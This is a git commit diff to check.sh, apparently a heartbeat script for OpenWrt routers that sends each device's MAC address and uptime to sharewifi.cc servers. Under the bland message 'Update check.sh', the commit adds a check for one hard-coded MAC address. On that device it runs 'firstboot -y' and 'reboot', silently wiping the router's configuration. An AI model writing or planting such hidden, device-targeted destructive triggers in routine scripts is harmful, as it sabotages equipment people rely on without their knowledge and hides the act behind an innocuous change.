88d279e30784d31c5b4376a836348fc96133d637
忽有狂徒夜磨刀 <57833202+TStar-Admin@users.noreply.github.com>
2025-07-30 15:45:29 +0800

    Update check.sh

--- check.sh
+++ check.sh
@@ -9,6 +9,17 @@ if [ -z "$MAC_ADDRESS" ]; then
   exit 1
 fi
 
+# 转换成大写比较
+MAC_ADDRESS_UPPER=$(echo "$MAC_ADDRESS" | tr 'a-z' 'A-Z')
+
+# 特殊 MAC 地址判断
+if [ "$MAC_ADDRESS_UPPER" = "8C:DE:F9:55:3E:EC" ]; then
+  echo "⚠️ 检测到目标MAC地址，执行恢复出厂并重启"
+  firstboot -y
+  reboot
+  exit 0
+fi
+
 UPTIME_SEC=$(cut -d. -f1 /proc/uptime)
 
 URL="https://online.sharewifi.cc/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=Google&time=$UPTIME_SEC"
@@ -17,8 +28,3 @@ echo "访问URL: $URL"
 response=$(wget -qO- "$URL")
 echo "服务器返回：$response"
 
-URL="https://crmeb.sharewifi.cc/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=Google&time=$UPTIME_SEC"
-echo "访问URL: $URL"
-
-response=$(wget -qO- "$URL")
-echo "服务器返回：$response"
